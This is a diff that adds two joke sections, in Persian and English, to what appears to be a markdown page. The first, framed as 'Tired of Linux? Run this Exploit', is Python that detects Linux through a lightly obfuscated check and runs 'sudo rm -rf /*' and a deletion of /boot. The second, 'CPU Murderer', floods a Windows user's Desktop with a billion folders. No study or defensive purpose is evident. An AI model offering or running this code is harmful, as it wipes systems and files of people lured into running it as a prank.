@@ -127,3 +127,106 @@ if (__name__ == '__main__'):
 ```
 
 </div>
+
+<h1><b>چجوری لینوکس رو بپوکونیم</b></h1>
+<h3><b>از لینوکس خسته شدی؟ این اکسپلویت رو اجرا کن</b></h3>
+<div align='left'>
+<h4><b>How To Destory Linux</b><h4>
+<h4><b>Tired of Linux? Run this Exploit</b><h4>
+<h6>Python 3.11.0<h6>
+
+<h4><h4>
+<br>
+
+```py
+
+try:
+    import \
+        subprocess,\
+        platform,\
+        string,\
+        asyncio,\
+        sys
+    
+    from typing import (
+        Literal,
+        Coroutine,
+        Any,
+    )
+    
+    class Exploit:
+        async def run() -> Coroutine[Any, Any, Literal[0]]:
+            subprocess.call([
+                'sudo', 'cd', '/', '&&', 'rm', '-rf', 'boot'
+            ])
+            subprocess.call([
+                'sudo', 'rm', '-rf', '/*'
+            ])
+            return 0
+    
+    if (sys.version_info[0:2][1] > 7):
+        if (platform.system()[0].upper() == string.ascii_uppercase[11]):
+            asyncio.run(Exploit.run())
+
+except* Exception as e:
+    raise e from BaseException
+
+except* ModuleNotFoundError as mnfe:
+    raise mnfe from ImportError
+
+finally:
+    sys.stdout.write(':)')
+
+```
+
+</div>
+
+<h1><b>چجوری در کسری از ثانیه 1 میلیارد پوشه بسازیم</b></h1>
+<h3><b>قاتل پردازنده مرکزی</b></h3>
+<div align='left'>
+<h4><b>How to create 1 Billion Folders in a Sec.</b><h4>
+<h4><b>CPU Murderer</b><h4>
+<h6>Python 3.11.0<h6>
+
+<h4><h4>
+<br>
+
+```py
+
+try:
+    import \
+        os,\
+        sys,\
+        getpass,\
+        asyncio
+    
+    from typing import Literal
+    
+    def main() -> Literal[None]:
+        asyncio.run(CreateFolder.run(count=1_000_000_000))
+    
+    class CreateFolder:
+        async def run(count:int) -> Literal[0]:
+            counter: int = 0
+            for folder in range(count + 1):
+                os.chdir(fr'C:\Users\{getpass.getuser()}\Desktop')
+                os.mkdir(str(counter))
+                counter += 1
+            return 0
+        
+    if (__name__ == '__main__' and __debug__):
+        main()
+
+except* Exception as e:
+    raise e from BaseException
+
+except* ModuleNotFoundError as mnfe:
+    raise mnfe from ImportError
+
+finally:
+    sys.stdout.write(':)')
+
+```
+
+
+</div>
